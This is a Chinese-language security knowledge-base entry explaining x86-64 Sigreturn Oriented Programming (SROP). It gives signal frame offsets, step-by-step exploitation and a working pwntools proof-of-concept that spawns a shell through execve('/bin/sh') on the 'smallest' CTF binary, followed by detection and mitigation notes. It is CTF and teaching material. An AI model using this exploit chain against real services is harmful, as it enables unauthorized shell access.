---
id: binary-pwn-stack-x64-srop-sigreturn-frame-execve
title: x86-64 SROP：栈上伪造 rt_sigreturn frame，借 read 返回值置 rax=15 一次恢复全部寄存器执行 execve
type: scenario
domain: binary
path: binary/pwn/stack
technique: x86-64-srop-forged-sigreturn-frame
aliases:
- SROP
- Sigreturn Oriented Programming
- 64 位 SROP
- rt_sigreturn frame 伪造
- read 返回值置 rax=15
- syscall chain
- 春秋杯 smallest
tags:
- binary
- pwn
- srop
- sigreturn
- x86-64
- stack
- execve
- syscall
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-19
  verified_at: '2026-11-08T08:53:40+08:00'
  notes: 已对照原文核对：图为 27 张逐一确认，frame 偏移（uc_flags 起 rdi=0x68/rax=0x90/rip=0xa8/cs=0xb8=0x33）与 smallest 的 0x4000b0/0x4000be 一致，read(15)->rt_sigreturn->execve 全链路及 getshell+flag 有截图证据；未验证点：偏移 0x229 与 recv()[0x2d0] 依赖具体题目栈布局，仅对 smallest 成立
---

## 一句话结论

内核处理信号时把整个 `ucontext`（含全部寄存器）**保存在用户栈上**，`rt_sigreturn` 恢复时只看这块内存、不校验它是否由内核写的；攻击者只要控制栈并让 `rax=15`（x86-64 的 `__NR_rt_sigreturn`）再执行 `syscall`，就能用一份伪造的 signal frame 一次性设定所有寄存器，直接 `execve("/bin/sh", 0, 0)`——即使程序里没有任何 `pop rdi; ret` 之类的 gadget。

## 原理

- **信号流程**：进程收到信号 → 进入内核 → 内核在用户栈上压入 `sigreturn` 地址、`ucontext`（`uc_flags`、`uc_stack`、`sigcontext` 全部寄存器）、`siginfo` → 跳到用户注册的 handler → handler `ret` 回到 trampoline（`__restore_rt`）→ 执行 `mov rax, 0xf; syscall` → 内核按栈上的 frame 恢复寄存器并 `iret` 回原 `rip`。
- **为什么可被劫持**：这块 frame 位于**用户可写的地址空间**；内核“对信号处理器不可知”（kernel agnostic about signal handlers），它不记录“这个进程当前应该对应哪份 frame”，因此 `rt_sigreturn` 时栈上放什么就恢复什么。这是设计使然，不是实现 bug，所以 SROP 在几乎所有 Linux 版本上通用。
- **frame 布局与关键偏移**（x86-64，自 `uc_flags` 起）：
  ```text
  0x00 uc_flags | 0x08 &uc | 0x10 uc_stack.ss_sp | 0x18 uc_stack.ss_flags
  0x20 uc_stack.ss_size | 0x28 r8 | 0x30 r9 | 0x38 r10 | 0x40 r11
  0x48 r12 | 0x50 r13 | 0x58 r14 | 0x60 r15 | 0x68 rdi | 0x70 rsi
  0x78 rbp | 0x80 rbx | 0x88 rdx | 0x90 rax | 0x98 rcx | 0xa0 rsp
  0xa8 rip | 0xb0 eflags | 0xb8 cs/gs/fs | 0xc0 err | 0xc8 trapno
  0xd0 oldmask | 0xd8 cr2 | 0xe0 fpstate | 0xe8... sigmask
  ```
  其中 `0xb8` 处的 `cs` 必须是 `0x33`（64 位用户代码段），否则寄存器能恢复但后续执行会异常。
- **怎么把 rax 变成 15**：不需要 `pop rax`，用 `read(fd, buf, 15)` 读满 15 字节，返回值就是 15；也可以让 `read` 返回任意字节数来选系统调用（返回 1 → write，返回 0 → read，返回 15 → rt_sigreturn）。
- **利用形态**：
  - 单次：frame 设 `rax=59(execve)`、`rdi="/bin/sh"`、`rsi=rdx=0`、`rip=syscall`，sigreturn 一返回就 execve。
  - 系统调用链：把 `rip` 指向 `syscall; ret`、`rsp` 指向下一份 frame，每次 `syscall` 返回后 `ret` 弹出新 frame 的入口，串起 `read/write/open` 等 ORW 链（无 libc、无 `/bin/sh` 时常用）。
- **为什么绕过 NX/ASLR 有效**：SROP 只用“已有的 `syscall` 指令 + 栈数据”，不需要可执行栈，也不需要知道 libc 基址；只要拿到 `syscall` gadget 地址和一块可控栈（含 `/bin/sh` 字符串）即可。若二进制是静态链接、gadget 极少（如只有 6 条指令的 smallest），SROP 几乎是最短路径。

## 触发条件

- 存在栈溢出/任意栈写，能覆盖足够大的区域（一份 frame 约 0xF8 字节，含 `sigmask` 更长），且知道栈地址（或能先泄漏）。
- 程序内有 `syscall` 指令（或 `syscall; ret`）可用；知道其地址（无 PIE 时直接读，PIE 需先泄漏）。
- 能把 `rax` 置为 15：常见做法是 `read` 的返回字节数（要恰好 15），或用现成的 `pop rax` gadget。
- 需要 `/bin/sh` 字符串地址（可写在栈上，配合栈泄漏）。
- 若开了 seccomp 且过滤 `rt_sigreturn`（或只允许特定 syscall），SROP 直接失效，需要改走允许的 syscall 链。

## 利用步骤

1. 找溢出点与栈布局，确认能覆盖返回地址并留出 ≥0x100 字节空间放 frame。
2. 泄漏栈地址（例如先 `read` 返回到 `write(1, rsp, n)` 把栈打印出来），得到 `stack_addr` 与 `/bin/sh` 的落点。
3. 第一段 payload：`read_ret` + `syscall_ret` + `read_ret`（用 read 的返回值控制 `rax`：返回 1 → write 泄漏；再 read 回来继续）。
4. 第二段 payload：`read_ret` + 8 字节填充 + `SigreturnFrame`（`rax=59, rdi=bin_sh, rsi=0, rdx=0, rsp=stack_addr, rip=syscall_ret`）+ `"/bin/sh\0"`。
5. 第三段 payload：`syscall_ret` + 7 字节填充，使 `read` 恰好返回 15 → `rax=15` → 执行 `syscall` 即 `rt_sigreturn`。
6. sigreturn 恢复 frame → `rip=syscall_ret` 且 `rax=59`、`rdi=/bin/sh` → `execve("/bin/sh", NULL, NULL)`。

## PoC

```python
from pwn import *
context.arch = 'amd64'

read_ret    = 0x4000B0   # xor rax,rax; mov edx,0x400; mov rsi,rsp; mov rdi,rax; syscall; ret
syscall_ret = 0x4000BE   # syscall; ret

# 1) 泄漏栈：read 返回 1 -> write(1, rsp, 0x400)
p.send(p64(read_ret) + p64(syscall_ret) + p64(read_ret))
p.send(b"\xb3")
stack = u64(p.recv()[0x2d0:0x2d8])

# 2) 放 frame（execve("/bin/sh",0,0)）
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack - 0x229      # /bin/sh 地址
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack
frame.rip = syscall_ret
p.send(p64(read_ret) + p64(0) + bytes(frame) + b"/bin/sh\x00")

# 3) 让 read 返回 15 -> rax=15 -> syscall -> rt_sigreturn
p.send(p64(syscall_ret) + b"\x00" * 7)
p.interactive()
```

说明：`0x229` 是原文 smallest 题目中栈帧到 `/bin/sh` 的固定偏移；换成其它题目需按实际布局重算。`cs` 由 pwntools 的 `SigreturnFrame()` 默认填 0x33。

## 变体与关联

- **32 位变体**：`__NR_sigreturn=0x77`，frame 约 0x50 字节，`int 0x80`；见 [[binary-pwn-stack-32bit-srop-read-return-sigreturn]]、[[binary-pwn-stack-mips-srop-sigreturn-bss-execve]]。
- **系统调用链变体**：`rip=syscall;ret` + `rsp` 指向下一 frame，串 `mprotect`→`read`→`jmp rsp` 或 `open/read/write`，用于沙箱/无 libc 场景。
- **信号栈变体**：`sigaltstack` 设置的自定义栈同样放 frame，可结合 `ucontext` 劫持，见 [[binary-pwn-stack-sigaltstack-ucontext-sigreturn-hijack]]。
- **框架变体**：pwntools `SigreturnFrame(arch='amd64')`、`pwnlib.rop.srop`；也可手写 `p64` 按上表偏移拼。
- **关联**：[[binary-pwn-rop-alarm-got-syscall-ret2csu-orw]]（无 libc 的 syscall 链）、[[binary-pwn-rop-mov-rsp-rdi-jmp-r13-system]]（栈迁移后接 system）。

## 检测与防御

- **利用侧识别**：payload 中出现长段可控数据恰好落在栈上 `ucontext` 布局（`r8..r15`、`rax=15`、`cs=0x33`）；同一进程短时间内 `read` 返回值恰好 15 后立即 `syscall`；`rt_sigreturn` 调用时栈指针不在 signal handler 的正常 frame 内。
- **缓解（二进制侧）**：栈保护（canary）、PIE + 全 RELRO、消除 `syscall; ret` 直连 gadget（改用 `syscall` 后不 ret）、CET/影子栈（SHSTK）可阻断返回地址劫持。
- **缓解（内核侧）**：seccomp 白名单只放行必要 syscall（过滤 `rt_sigreturn` 需谨慎，会影响正常信号）；`CONFIG_X86_SMAP/SMEP` 不能阻止 SROP（它只用合法 syscall），需靠 CFI/shadow stack。
- **检测**：审计异常 `rt_sigreturn` 的调用上下文（frame 的 `rip` 指向 `syscall; ret` gadget、`rax=59`、`rdi` 指向 `/bin/sh`）；对 CTF 外的真实服务，关注进程收到信号后立即 execve 的异常行为。
